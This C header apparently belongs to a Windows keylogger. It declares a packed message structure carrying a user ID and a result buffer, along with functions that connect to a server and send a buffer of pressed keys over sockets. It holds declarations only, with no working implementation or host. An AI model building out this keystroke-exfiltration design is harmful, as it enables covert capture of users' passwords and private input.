#ifndef SENDER_H
#define SENDER_H
#define STATUS_SUCCESS (NTSTATUS)0x00000000L

typedef struct {
    DWORD  resultLen;
    DWORD  userIdLen;
    char data[];
} __attribute__((packed)) Message;

extern NTSTATUS NtClose(
    IN HANDLE Handle
);

extern char* userId;
extern char* result;

/**
 * @brief Initializes the client’s socket and establishes a connection to the server.
 *
 * @param param Pointer to the mutex passed by the system to the thread function.
 *
 */
void initSocketClient(void* param);

/**
 * @brief Sends data from a buffer containing pressed keys to the server via sockets.
 *
 * @param clientSocket SOCKET WSAAPI client's socket.
 * @param socketResult Integer indicating the status of the socket connection or the state of the sent request.
 *
 */
void send_(SOCKET clientSocket, int socketResult, HANDLE hMutex);

/**
 * @brief Prepares a message to send via socket.
 *
 * @param outSize Pointer to a DWORD indicating a total size of the message to send.
 *
 */
char* prepareMessage();

#endif
